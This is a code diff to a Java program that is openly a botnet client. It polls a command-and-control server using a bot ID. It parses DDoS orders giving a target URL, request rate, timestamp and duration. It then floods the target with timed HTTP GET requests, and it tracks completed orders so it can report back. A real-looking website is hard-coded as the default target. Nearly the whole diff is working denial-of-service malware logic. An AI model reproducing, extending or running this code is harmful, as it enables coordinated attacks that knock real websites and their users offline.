@@ -26,16 +26,19 @@ public class Main {
 	private static String TARGET_URL = "http://www.yolocaust.de/tentob/";
 	private static int DDOS_FREQUENCY = 3; // attempts per second
 	private static int DDOS_DURATION; // in seconds
+	private static String CURRENT_DDOS_TIMESTAMP;
+	private static String OLD_DDOS_TIMESTAMP;
+	private static String CC_URL_APPENDIX = "";
 
 	private static void requestCC() throws Exception {
 
 		// set up connection
-		String ccUrl = CC_URL + BOT_ID;
+		String ccUrl = CC_URL + BOT_ID + CC_URL_APPENDIX;
 		URL ccUrlObj = new URL(ccUrl);
 		HttpURLConnection hhHttpURLConnection = (HttpURLConnection) ccUrlObj.openConnection();
 		hhHttpURLConnection.setRequestMethod("GET");
 		hhHttpURLConnection.setRequestProperty("User-Agent", USER_AGENT);
-
+		
 		// get response
 		BufferedReader in = new BufferedReader(new InputStreamReader(hhHttpURLConnection.getInputStream()));
 		String inputLine;
@@ -57,13 +60,14 @@ public class Main {
 			case DDOS_COMMAND:
 				// expecting 3 more args besides command
 				String[] splittedResponse = response.toString().split(" ");
-				if (splittedResponse.length == 4) {
+				if (splittedResponse.length == 5) {
 					COMMAND = DDOS_COMMAND;
 					TARGET_URL = splittedResponse[1];
 					DDOS_FREQUENCY = Integer.parseInt(splittedResponse[2]);
-					DDOS_DURATION = Integer.parseInt(splittedResponse[3]);
+					CURRENT_DDOS_TIMESTAMP = splittedResponse[3];
+					DDOS_DURATION = Integer.parseInt(splittedResponse[4]);
 				} else
-					System.err.println("x args given, y args expecting => doing nothing");
+					System.err.println(splittedResponse.length+" args given, 5 args expecting => doing nothing");
 				break;
 
 			default:
@@ -76,23 +80,46 @@ public class Main {
 
 	private static void performDDoS() throws Exception {
 
-		if(TARGET_URL != null && !TARGET_URL.isEmpty()) {
-			for (int i = 0; i < DDOS_FREQUENCY; i++) {
-				URL ccUrlObj = new URL(TARGET_URL);
-				HttpURLConnection hhHttpURLConnection = (HttpURLConnection) ccUrlObj.openConnection();
-				hhHttpURLConnection.setRequestMethod("GET");
-				hhHttpURLConnection.setRequestProperty("User-Agent", USER_AGENT);
-	
-				BufferedReader in = new BufferedReader(new InputStreamReader(hhHttpURLConnection.getInputStream()));
-				/*
-				 * String inputLine; StringBuffer response = new StringBuffer();
-				 * while ((inputLine = in.readLine()) != null)
-				 * response.append(inputLine);
-				 */
-				in.close();
-			}
-		} else
-			System.err.println("No Target-URL specified => no attack performed");
+		if(OLD_DDOS_TIMESTAMP==null||!OLD_DDOS_TIMESTAMP.equals(CURRENT_DDOS_TIMESTAMP)) {
+			
+			// not yet a DDoS attack performed
+			// or a new order
+			OLD_DDOS_TIMESTAMP = CURRENT_DDOS_TIMESTAMP;
+			
+			if (TARGET_URL != null && !TARGET_URL.isEmpty()) {
+				int counter = DDOS_DURATION;
+				while(counter>0) {
+					long start = System.currentTimeMillis();
+					for (int i = 0; i < DDOS_FREQUENCY; i++) {
+						URL ccUrlObj = new URL(TARGET_URL);
+						
+						HttpURLConnection httpURLConnection = (HttpURLConnection) ccUrlObj.openConnection();
+						httpURLConnection.setRequestMethod("GET");
+						httpURLConnection.setRequestProperty("User-Agent", USER_AGENT);
+						httpURLConnection.setUseCaches(false);
+						
+						BufferedReader in = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
+						String inputLine;
+						StringBuffer response = new StringBuffer();
+						while ((inputLine = in.readLine()) != null)
+							response.append(inputLine);
+						in.close();
+					}
+					long dur = System.currentTimeMillis()-start;
+					if(dur<1000) {
+						// took fewer than 1s
+						// sleep the leftover
+						Thread.sleep(1000-dur);
+					}
+					counter--;
+				}
+				System.out.println("attack performed");
+			} else
+				System.err.println("no Target-URL specified => no attack performed");
+		} else {
+			// old timestamp - attack already performed
+			CC_URL_APPENDIX = "&dstate=done";
+		}
 
 		return;
 	}
